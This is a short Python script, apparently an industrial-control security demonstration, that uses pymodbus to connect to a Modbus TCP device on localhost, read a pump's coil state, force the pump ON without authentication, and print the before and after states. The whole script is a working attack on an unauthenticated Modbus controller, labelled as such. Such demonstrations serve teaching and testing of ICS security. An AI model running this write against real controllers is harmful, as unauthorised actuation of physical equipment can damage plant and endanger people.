from pymodbus.client.sync import ModbusTcpClient

client = ModbusTcpClient("127.0.0.1", port=502)
client.connect()

print("[*] Pump BEFORE attack:")
before = client.read_coils(0, 1).bits[0]
print(f"    Pump = {before}")

print("[!] ATTACK: forcing pump ON (no password needed)...")
client.write_coil(0, True)

print("[*] Pump AFTER attack:")
after = client.read_coils(0, 1).bits[0]
print(f"    Pump = {after}")

client.close()
